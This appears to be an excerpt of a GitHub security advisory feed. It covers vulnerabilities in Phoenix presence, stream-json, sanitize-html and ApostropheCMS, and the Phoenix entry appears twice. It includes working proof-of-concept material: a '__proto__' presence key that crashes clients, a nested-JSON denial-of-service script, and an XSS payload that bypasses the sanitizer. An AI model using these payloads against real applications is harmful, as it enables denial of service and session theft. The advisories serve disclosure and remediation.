<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
        <updated>2026-09-03T20:30:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
<h3 id="details">Details</h3>
<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stream-json] stream-json: pick/ignore/filter/replace filters are O(depth²) on nested input — small crafted JSON blocks the event loop for seconds→minutes (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-528h-pc64-c93x</id>
        <link href="https://github.com/advisories/GHSA-528h-pc64-c93x"/>
        <updated>2026-09-03T20:27:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The path filters <code>pick</code>, <code>ignore</code>, <code>filter</code>, and <code>replace</code> — the library's headline "surgical extraction" feature — recompute the full path string from the nesting stack on <strong>every checkable token</strong>. Because the stack length equals the current nesting depth, and a checkable token is emitted at every level, processing a document of depth <em>D</em> costs <strong>O(D²)</strong>, not O(D).</p>
<p>This is triggered by document <strong>structure (nesting depth), not byte volume</strong>, so a tiny payload achieves outsized CPU cost, and it is the ordinary "traverse until the filter matches" path — including the exact README flagship example <code>pick({filter: 'data'})</code>. Any service that uses these filters to extract a field from an untrusted (or larger-than-memory) JSON body — the primary documented use case — can be made to block its event loop.</p>
<h3 id="affected-code-v340">Affected code (v3.4.0)</h3>
<p><code>src/core/filters/filter-base.js</code>:</p>
<pre><code class="language-js">// L26-32 — string filter: rejoins the ENTIRE stack on every call
const stringFilter = (string, separator) =&gt; {
  const stringWithSeparator = string + separator;
  return stack =&gt; {
    const path = stack.join(separator);              // O(depth) — every call
    return path === string || path.startsWith(stringWithSeparator);
  };
};

// L34-39 — regexp filter: same
const regExpFilter = (regExp, separator) =&gt; {
  return stack =&gt; {
    regExp.lastIndex = 0;
    return regExp.test(stack.join(separator));       // O(depth) — every call
  };
};
</code></pre>
<pre><code class="language-js">// L194 — filter(stack, chunk) is invoked for EVERY checkable token while in the 'check' state
const action = checkableTokens[chunk.name] !== 1 ? nonCheckableAction : filter(stack, chunk) ? specialAction : defaultAction;
</code></pre>
<p><code>stack</code> is pushed/popped on <code>startObject</code>/<code>startArray</code>/end (L239-250), so <code>stack.length === depth</code>. For a depth-<em>D</em> document that hasn't matched yet, <code>filter()</code> runs once per level and each call is O(depth) ⇒ <strong>O(D²)</strong> total.</p>
<p><strong>Not affected:</strong> the <code>streamArray</code>/<code>streamObject</code>/<code>streamValues</code> streamers use <code>asm.depth</code> (an O(1) getter), so they don't exhibit this. The issue is specific to <code>filter-base.js</code> recomputing the path string.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<pre><code>npm i stream-json@3.4.0
node poc-quadratic-dos.mjs
</code></pre>
<pre><code class="language-js">import parserStream from 'stream-json';
import { pick } from 'stream-json/filters/pick.js';
import chain from 'stream-chain';

function run(D) {
  const doc = '{"meta":'.repeat(D) + '1' + '}'.repeat(D); // depth D, never matches "data"
  return new Promise((resolve) =&gt; {
    const t0 = process.hrtime.bigint();
    const pipeline = chain([parserStream(), pick({ filter: 'data' })]);
    pipeline.on('data', () =&gt; {});
    pipeline.on('end', () =&gt; resolve({ D, bytes: doc.length, ms: Number(process.hrtime.bigint() - t0) / 1e6 }));
    pipeline.write(doc); pipeline.end();
  });
}
for (const D of [5000, 10000, 20000, 40000]) {
  const r = await run(D);
  console.log(`D=${r.D}  bytes=${r.bytes}  ms=${Math.round(r.ms)}`);
}
</code></pre>
<p>Measured (Node v24, single core, clean <code>npm i stream-json@3.4.0</code>):</p>
<pre><code>D=5000    bytes= 45001   ms=  160
D=10000   bytes= 90001   ms=  603   (3.8x for 2x input  -&gt; quadratic)
D=20000   bytes=180001   ms= 2511   (4.2x)
D=40000   bytes=360001   ms=11823   (4.7x)
</code></pre>
<p>A <strong>~360 KB</strong> body (pure nesting, no data) blocks the event loop for <strong>~12 seconds</strong>; extrapolating O(D²), ~1–2 MB reaches single-digit minutes of CPU on one request.</p>
<h2 id="impact">Impact</h2>
<p>Remote, unauthenticated denial of service against any application that runs untrusted JSON through <code>pick</code>/<code>ignore</code>/<code>filter</code>/<code>replace</code> with a string or RegExp filter — the documented primary use of the library. A small request pins a CPU core / blocks the Node event loop, degrading or halting the service.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Maintain the joined path incrementally instead of rejoining the whole stack per token:</p>
<ul>
<li>On <code>startObject</code>/<code>startArray</code> push: append <code>separator + key</code> to a cached path string (and remember the pre-push length).</li>
<li>On end/pop: truncate the cached path back to the remembered length.</li>
<li>Filters test/<code>startsWith</code> against the cached string — O(1) amortized per token, making the whole traversal O(D).</li>
</ul>
<p>Alternatively expose/enforce a maximum nesting depth for the filter path check.</p>
<h2 id="resolution">Resolution</h2>
<p>Fixed in 3.5.0. The path filters now cap JSON nesting depth at 1024 by default and throw a RangeError beyond it; upgrading is enough. Opt out with <code>maxDepth: Infinity</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/uhop/stream-json/security/advisories/GHSA-528h-pc64-c93x">https://github.com/uhop/stream-json/security/advisories/GHSA-528h-pc64-c93x</a></li>
<li><a href="https://github.com/uhop/stream-json/commit/a869fb98aaef9225556f49901a8f55954ff856e6">https://github.com/uhop/stream-json/commit/a869fb98aaef9225556f49901a8f55954ff856e6</a></li>
<li><a href="https://github.com/advisories/GHSA-528h-pc64-c93x">https://github.com/advisories/GHSA-528h-pc64-c93x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-528h-pc64-c93x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:27:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanitize-html] ApostropheCMS: Mutation-XSS / allowedTags bypass via literal `</textarea/>` solidus close]]></title>
        <id>https://github.com/advisories/GHSA-jxwj-j7wr-gfrw</id>
        <link href="https://github.com/advisories/GHSA-jxwj-j7wr-gfrw"/>
        <updated>2026-09-03T20:07:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A mutation-XSS / allowedTags bypass: when <code>textarea</code> (or <code>xmp</code>) is included in <code>allowedTags</code>, an input containing a literal <code>&lt;/textarea/&gt;</code> (a solidus right after the RCDATA end-tag name) lets non-allowed markup such as <code>&lt;img src=x onerror=…&gt;</code> pass through <code>sanitizeHtml()</code> <strong>live and unescaped</strong>, even though <code>img</code>/<code>onerror</code> are not in the allowlist. A spec-compliant browser executes the surviving handler — XSS. This is a literal-solidus variant that bypasses the two most recent fixes in this code area (CVE-2026-40186, CVE-2026-44990), both already applied in 2.17.5. The default configuration is not affected.</p>
<h3 id="details">Details</h3>
<p><code>sanitize-html</code> emits the text content of HTML raw-text elements (<code>textarea</code>, <code>xmp</code>) without escaping. Two things combine:</p>
<ul>
<li><strong>Parser differential:</strong> on input, htmlparser2 does NOT recognize <code>&lt;/textarea/&gt;</code> (solidus after the RCDATA
end-tag name) as a close tag; it emits <code>&lt;/textarea/&gt;&lt;img …&gt;</code> as a single raw-text node.</li>
<li><strong>Unescaped passthrough:</strong> the <code>ontext</code> handler (<code>index.js</code> ~575-583) appends <code>textarea</code>/<code>xmp</code> content with
<code>result += text</code> (no <code>escapeHtml</code>), assuming it is "already properly encoded" — true for entity-decoded
content (what CVE-2026-40186 fixed) but false for this mis-tokenized literal close tag.
A spec browser treats <code>&lt;/textarea/&gt;</code> as a valid <code>textarea</code> close, so the following <code>&lt;img onerror&gt;</code> is parsed as a live element. The recent fixes addressed entity-encoding (CVE-2026-40186) and the <code>xmp</code> default (CVE-2026-44990); neither covers the literal-solidus mis-tokenization, so the raw passthrough still leaks.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">// npm i sanitize-html@2.17.5 parse5 &amp;&amp; node poc.js
const sanitizeHtml = require('sanitize-html');
const input = '&lt;textarea&gt;&lt;/textarea/&gt;&lt;img src=x onerror="alert(document.domain)"&gt;';
const opts  = { allowedTags: sanitizeHtml.defaults.allowedTags.concat(['textarea']) };  // img NOT allowed
console.log(sanitizeHtml(input, opts));
// =&gt; &lt;textarea&gt;&lt;/textarea/&gt;&lt;img src=x onerror="alert(document.domain)"&gt;&lt;/textarea&gt;
//    the &lt;img onerror&gt; survives live and unescaped

console.log(sanitizeHtml(input));   // default config (no textarea allowed) =&gt; ""  (safe)
</code></pre>
<p>Re-parsing the sanitized OUTPUT with <strong>parse5</strong> (the WHATWG HTML parser browsers/jsdom use) yields a <strong>live
<code>&lt;img src=x onerror=alert(document.domain)&gt;</code></strong> at <code>body</code> level (it escaped the textarea RCDATA, not inert text) → the <code>onerror</code> fires in a browser. Confirmed on 2.17.5 (Node v24). A canonical <code>poc.js</code> is attached.
<img width="650" height="118" alt="image" src="https://github.com/user-attachments/assets/d63bb5b7-ba3e-4b0e-a821-86a453ea0352"></p>
<h3 id="impact">Impact</h3>
<p>Cross-site scripting (CWE-79). Requires <code>textarea</code> (or <code>xmp</code>) in <code>allowedTags</code> — a benign-looking, common addition in form builders, CMS, and rich-text editors. Adding a harmless tag that then enables XSS via <em>non-allowed</em> <code>img</code>/<code>onerror</code> breaks the sanitizer's core contract; the maintainers have fixed this class before (e.g. GHSA-9mrh). An attacker who can submit content rendered through such a configuration achieves stored/reflected XSS (cookie theft, session hijack). Severity Medium (default config is safe; user interaction to view the page). <strong>Suggested fix:</strong> route <code>textarea</code>/<code>xmp</code> content through <code>escapeHtml</code> instead of the raw passthrough, and/or fix the htmlparser2 <code>&lt;/tag/&gt;</code> RCDATA end-tag tokenization to match the WHATWG spec.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-jxwj-j7wr-gfrw">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-jxwj-j7wr-gfrw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63670">https://nvd.nist.gov/vuln/detail/CVE-2026-63670</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/pull/5501">https://github.com/apostrophecms/apostrophe/pull/5501</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/eae1fb2b72ec5d1c27d0977509c6482a0408f725">https://github.com/apostrophecms/apostrophe/commit/eae1fb2b72ec5d1c27d0977509c6482a0408f725</a></li>
<li><a href="https://github.com/advisories/GHSA-jxwj-j7wr-gfrw">https://github.com/advisories/GHSA-jxwj-j7wr-gfrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jxwj-j7wr-gfrw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:07:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] ApostropheCMS: Missing destination-parent authorization in page `move()` allows a low-privileged editor to move and re-rank pages inside a restricted subtree]]></title>
        <id>https://github.com/advisories/GHSA-wr5r-wqp2-x4fh</id>
        <link href="https://github.com/advisories/GHSA-wr5r-wqp2-x4fh"/>
        <updated>2026-09-03T20:05:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ApostropheCMS enforces per-type authorization on pages: a page type may declare <code>editRole</code> / <code>publishRole</code> (and the core <code>@apostrophecms/archive-page</code> does), so a project can have page-type subtrees that only higher-privileged roles are allowed to create or edit within. The <code>move()</code> operation is supposed to enforce that a page may only be moved <em>into</em> a parent the actor has <strong>create</strong> rights over — this is the same boundary the page-insert route enforces (the insert target is fetched with <code>.permission('create')</code>).</p>
<p>A regression in the move authorization guard silently disabled that destination check for every normal move. The guard now reads <code>(oldParent._id !== parent._id) &amp;&amp; (parent.type !== '@apostrophecms/archive-page') &amp;&amp; (!parent._create) &amp;&amp; (oldParent.type === '@apostrophecms/archive-page' &amp;&amp; !parent._edit)</code>. Because the final <code>&amp;&amp;</code> clause requires <code>oldParent.type === '@apostrophecms/archive-page'</code>, the whole conjunction can only be true while restoring a page <em>out of the archive</em>. For any ordinary move (the source page's old parent is a normal page), that clause is <code>false</code>, the entire condition is <code>false</code>, and <code>!parent._create</code> is never evaluated. The only surviving gate in the whole path is <code>moved._edit</code> — i.e. "can the actor edit the page being moved", which a low-privileged editor legitimately holds for their own ordinary pages.</p>
<p>The result is that any authenticated user who can edit at least one page can relocate that page <strong>under a parent of a restricted type they have no create/edit rights over</strong>, and in doing so trigger an unauthenticated, unchecked <code>updateMany</code> that re-ranks the restricted parent's existing children (documents the actor cannot edit). This is reachable directly from the documented <code>PATCH</code>/<code>PUT /api/v1/@apostrophecms/page/:_id</code> REST routes via the attacker-controlled <code>_targetId</code> / <code>_position</code> body fields.</p>
<h2 id="affected-code-4310">Affected code (4.31.0)</h2>
<p>The broken guard in <code>move()</code> — <code>packages/apostrophe/modules/@apostrophecms/page/index.js</code>:</p>
<pre><code class="language-js">if (!moved._edit) {
  throw self.apos.error('forbidden');
}
if (!(parent &amp;&amp; oldParent)) {
  // Move outside tree
  throw self.apos.error('forbidden');
}
if (
  (oldParent._id !== parent._id) &amp;&amp;
  (parent.type !== '@apostrophecms/archive-page') &amp;&amp;
  (!parent._create) &amp;&amp;
  (oldParent.type === '@apostrophecms/archive-page' &amp;&amp; !parent._edit)   // &lt;-- regression: gates the whole check on "moving out of the archive"
) {
  throw self.apos.error('forbidden');
}
</code></pre>
<p>The target/parent is fetched with permission filtering explicitly OFF (so the guard above is the <em>only</em> thing that is supposed to enforce destination authorization) — <code>getTarget()</code>:</p>
<pre><code class="language-js">const target = await self.findForEditing(_req, criteria)
  .permission(false)        // target is located regardless of the actor's rights
  .archived(null)
  .areas(false)
  .ancestors({ depth: 1, ... permission: false })
  .children({ depth: 1, ... permission: false }).toObject();
</code></pre>
<p>The privileged sink that then runs unguarded — <code>nudgeNewPeers()</code> re-ranks the destination parent's existing children with a raw DB write and no permission check:</p>
<pre><code class="language-js">async function nudgeNewPeers() {
  const locale = moved.aposLocale.split(':')[0];
  const criteria = {
    path: self.matchDescendants(parent),
    aposLocale: { $in: [ `${locale}:draft`, `${locale}:published` ] },
    level: parent.level + 1,
    rank: { $gte: rank }
  };
  // Nudge down the pages that should now follow us
  await self.apos.doc.db.updateMany(criteria, { $inc: { rank: 1 } });
  ...
}
</code></pre>
<p>The REST entry point — the <code>patch</code> route reaches <code>move()</code> after only the <code>moved._edit</code> gate, with attacker-controlled <code>_targetId</code> / <code>_position</code>:</p>
<pre><code class="language-js">const page = await self.findOneForEditing(req, { _id });
...
if (!page._edit) {
  throw self.apos.error('forbidden');
}
...
if (input._targetId) {
  const targetId = self.apos.launder.string(input._targetId);
  const position = self.apos.launder.string(input._position);
  modified = await self.move(req, page._id, targetId, position);
}
</code></pre>
<p>For comparison, the sibling page-<strong>insert</strong> route enforces the destination boundary correctly by fetching the target with create-permission filtering, so an actor without create rights under the target gets <code>notfound</code>:</p>
<pre><code class="language-js">// post route (insert)
const target = await self.getTarget(req, ...).permission('create') ... // restricted target is not found -&gt; insert denied
</code></pre>
<h3 id="provenance-introduced-regression">Provenance (introduced regression)</h3>
<p>The guard was correct until commit <code>9f72bd229be07e537a2ae894f4527f2fe6bcd3bd</code> ("allow restore pages"), which changed it from <code>(oldParent._id !== parent._id) &amp;&amp; (parent.type !== '@apostrophecms/archive-page') &amp;&amp; (!parent._create)</code> to the four-clause version above. The intent was to stop legitimate <em>archive restores</em> (where <code>parent._create</code> can be false) from being wrongly forbidden, but ANDing the new clause onto the existing chain gated the entire <code>_create</code> enforcement on <code>oldParent</code> being the archive — silently removing destination authorization for all normal moves. The condition is unchanged at HEAD (4.31.0).</p>
<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
<p>The attacker is a low-privileged but content-editing authenticated user — in the core role model an <code>editor</code> or (in draft mode) a <code>contributor</code> — who can edit at least one ordinary page. No admin rights, no special tokens.</p>
<p>The differentiated-permission boundary that makes this a <em>bypass</em> must exist in the project. In core, <code>permission.can(req, 'create'/'edit', type)</code> is computed per page-type via <code>checkRoleConfig('editRole')</code>, so the boundary is present whenever a project configures a page type (or the archive) with an <code>editRole</code> / <code>publishRole</code> higher than the actor's role, or uses per-page <code>editPermission</code> / the <code>@apostrophecms/workflow</code> add-on to make <code>_edit</code> / <code>_create</code> page-specific. The core <code>@apostrophecms/archive-page</code> already ships <code>editRole: 'admin'</code> / <code>publishRole: 'admin'</code>, and restricted section page types are a standard pattern. On a single-role site where every editor can already edit every page, the boundary does not exist and there is no additional impact — hence Medium, not High, in the general case. Where the boundary exists, this is a cross-boundary tree-restructuring and protected-sibling-mutation bypass.</p>
<h2 id="impact">Impact</h2>
<p>A user with no create/edit rights over a restricted page-type subtree can:</p>
<ul>
<li>Relocate a page they control <strong>into</strong> that restricted subtree (placing their content beneath an admin-only/role-gated section, changing its URL/slug to inherit the protected branch's path, and altering site structure across an authorization boundary), and</li>
<li>Cause an unchecked <code>updateMany</code> to <strong>re-rank the restricted parent's existing children</strong> — i.e. mutate (reorder) documents the actor is explicitly not permitted to edit.</li>
</ul>
<p>This is an integrity / authorization-boundary violation. It does not, by itself, disclose restricted field contents (read access is still filtered elsewhere) — confidentiality impact is None — and it is not a remote code or availability bug. The security consequence is unauthorized modification of protected content structure/ordering and unauthorized placement of content inside a role-gated branch.</p>
<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
